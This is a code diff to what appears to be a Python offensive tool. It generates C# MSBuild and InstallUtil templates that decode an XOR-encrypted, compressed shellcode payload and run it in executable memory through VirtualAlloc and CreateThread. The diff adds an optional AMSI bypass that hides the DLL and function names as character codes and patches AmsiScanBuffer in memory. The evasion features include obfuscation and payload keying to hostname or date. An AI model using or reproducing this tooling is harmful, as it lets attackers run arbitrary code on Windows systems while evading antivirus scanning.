@@ -16,6 +16,7 @@ outfile=""
 encshell=""
 enctext=""
 enaobf=""
+noamsi=""
 password=""
 
 # Framework basepath
@@ -57,21 +58,25 @@ MSBUILD='''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/devel
 				using System;
 				using System.IO;
 				using System.Text;
+				using System.Threading;                
 				using Microsoft.Build.Framework;
 				using Microsoft.Build.Utilities;
 				using System.IO.Compression;
 				using System.Runtime.InteropServices;
-				using System.Threading;
 
 				public class AsmInstall :  Task, ITask
 				{
+
+					__AMSICODE__
 					public override bool Execute()
 					{
 						IntPtr processHandle = IntPtr.Zero;
 						Console.WriteLine("Started...");
+                        			__AMSI__
 						__PAYLOAD__
 						byte[] final=Decompress(Convert.FromBase64String(mydata));
-						byte[] password=Encoding.ASCII.GetBytes(__PASSWORD__);
+                        			string pass="__PASSWORD__";
+						byte[] password=Encoding.ASCII.GetBytes(pass);
 						if (password.Length!=0)
 							for(int i=0;i<final.Length;i++)
 								final[i]^=password[i%password.Length];
@@ -82,8 +87,8 @@ MSBUILD='''<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/devel
 					static byte[] Decompress(byte[] data)
 					{
 						byte[] buffer = new byte[32768];
-		                int read;
-		                using (MemoryStream compressedStream = new MemoryStream(data))
+		                		int read;
+		                		using (MemoryStream compressedStream = new MemoryStream(data))
 							using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
 								using (MemoryStream resultStream = new MemoryStream())
 											{
@@ -153,35 +158,38 @@ namespace Exec
 	{
 		private static __XTYPE__ MEM_COMMIT = 0x1000;
 		private static __XTYPE__ PAGE_EXECUTE_READWRITE = 0x40;
-					static byte[] Decompress(byte[] data)
-					{
-						byte[] buffer = new byte[32768];
-		                int read;
-		                using (MemoryStream compressedStream = new MemoryStream(data))
-							using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
-								using (MemoryStream resultStream = new MemoryStream())
-											{
-					                            while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0) resultStream.Write (buffer, 0, read);
-												return resultStream.ToArray();
-											}
-					}
+		__AMSICODE__
+		static byte[] Decompress(byte[] data)
+		{
+			byte[] buffer = new byte[32768];
+		        int read;
+		        using (MemoryStream compressedStream = new MemoryStream(data))
+				using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
+					using (MemoryStream resultStream = new MemoryStream())
+						{
+							while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0) resultStream.Write (buffer, 0, read);
+								return resultStream.ToArray();
+						}
+		}
 		private static IntPtr exec(byte[] final)
-					{
-						__XTYPE__ funcAddr = VirtualAlloc(0, (__XTYPE__)final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-						Marshal.Copy(final, 0, (IntPtr)(funcAddr), final.Length);
-						IntPtr hThread = IntPtr.Zero;
-						__XTYPE__ threadId = 0;
-						IntPtr pinfo = IntPtr.Zero;
-						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-						return hThread;
+		{
+			__XTYPE__ funcAddr = VirtualAlloc(0, (__XTYPE__)final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			Marshal.Copy(final, 0, (IntPtr)(funcAddr), final.Length);
+			IntPtr hThread = IntPtr.Zero;
+			__XTYPE__ threadId = 0;
+			IntPtr pinfo = IntPtr.Zero;
+			hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+			return hThread;
 		}
 		public override void Uninstall(System.Collections.IDictionary savedState)
 		{
 			IntPtr processHandle = IntPtr.Zero;
 			Console.WriteLine("Started...");
+            		__AMSI__
 			__PAYLOAD__
 			byte [] final = Decompress(Convert.FromBase64String(mydata))
-			byte[] password=Encoding.ASCII.GetBytes(__PASSWORD__);
+         	   	string pass="__PASSWORD__";
+			byte[] password=Encoding.ASCII.GetBytes(pass);
 			if (password.Length!=0)
 				for(int i=0;i<final.Length;i++)
 					final[i]^=password[i%password.Length];
@@ -218,6 +226,38 @@ namespace Exec
 		}
 		}
 }'''
+
+
+# Template for AMSI
+###################
+AMSI='''                                        
+					public static int removeit()
+                                        {
+                                                string lib=""+(char)97 + (char)109 + (char)115 + (char)105 + (char)46 + (char)100 + (char)108 + (char)108;
+                                                string buf=""+(char)65 + (char)109 + (char)115 + (char)105 + (char)83 + (char)99 + (char)97 + (char)110 + (char)66 + (char)117 + (char)102 + (char)102 + (char)101 +(char)114;
+                                                IntPtr dllHandle = LoadLibrary(lib);
+                                                if (dllHandle == null) return -1;
+                                                IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle,buf);
+                                                if (AmsiScanbufferAddr == null) return -2;
+                                                IntPtr OldProtection = Marshal.AllocHGlobal(4);
+                                                bool VirtualProtectRc = VirtualProtect(AmsiScanbufferAddr, 0x0015, 0x40, OldProtection);
+                                                if (VirtualProtectRc == false) return -3;
+                                                var patch = new byte[] { 0x31, 0xff, 0x90 };
+                                                IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
+                                                Marshal.Copy(patch, 0, unmanagedPointer, 3);
+                                                MoveMemory(AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
+                                                return 0;
+                                        }
+               				[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+                			private static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+                			[DllImport("kernel32.dll")]
+                			public static extern IntPtr LoadLibrary(string ddltoLoad);
+                			[DllImport("kernel32.dll")]
+                			public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+                			[DllImport("kernel32.dll", SetLastError = true)]
+                			static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,uint flNewProtect, IntPtr lpflOldProtect);
+
+'''
 
 # xor with date, hostname or domainname
 #######################################
@@ -282,6 +322,12 @@ def installUtil(fwpath,payload,x64=False):
 	global infile
 	global outfile
 	text=obfuscatecs(INSTALLUTIL)
+        if noamsi:
+		text=text.replace("__AMSI__","removeit();")
+		text=text.replace("__AMSICODE__",AMSI)
+        else:
+                text=text.replace("__AMSI__","")
+		text=text.replace("__AMSICODE__","")
 	if x64:
 		text=text.replace("__XTYPE__","ulong")
 	else:
@@ -316,6 +362,12 @@ def msbuild(fwpath,payload,x64=False):
 	x=x[1].split("]]>\n")
 	tail="]]>\n"+x[1]
 	text=head+obfuscatecs(x[0])+tail
+        if noamsi:
+                text=text.replace("__AMSI__","removeit();")
+                text=text.replace("__AMSICODE__",AMSI)
+        else:
+                text=text.replace("__AMSI__","")
+                text=text.replace("__AMSICODE__","")
 	if x64:
 		text=text.replace("__XTYPE__","ulong")
 	else:
@@ -353,6 +405,7 @@ parser.add_argument('--encshell', dest='encshell', action='store', default=None,
 parser.add_argument('--enctext', dest='enctext', action='store', default=None, help='Text to xorencode payload with, used with hostname or domain')
 parser.add_argument('--custom',dest='custom', action='store', default=None, help='Custom binary payload (don\'t use with --payload/--lhost/--lport')
 parser.add_argument('--x64',dest='x64', action='store_const', const=True, default=False, help='set if your custom payload is x64')
+parser.add_argument('--noamsi',dest='noamsi', action='store_const', const=True, default=False, help='set if you want to enable AMSI bypass')
 args=parser.parse_args()
 
 # Arguments checks
@@ -377,6 +430,7 @@ if args.custom!=None and (args.payload!=None or args.lhost!=None or args.lport!=
 	sys.exit()
 
 enaobf=args.enaobf
+noamsi=args.noamsi
 
 # XOR payload
 if args.encshell!=None:
@@ -411,6 +465,9 @@ if args.encshell!=None:
 print "Framework: "+args.fwv
 if (enaobf):
 	print "CS obfuscation enabled"
+
+if (noamsi):
+	print "AMSI bypass enabled"
 
 x64=False
 if args.custom!=None:
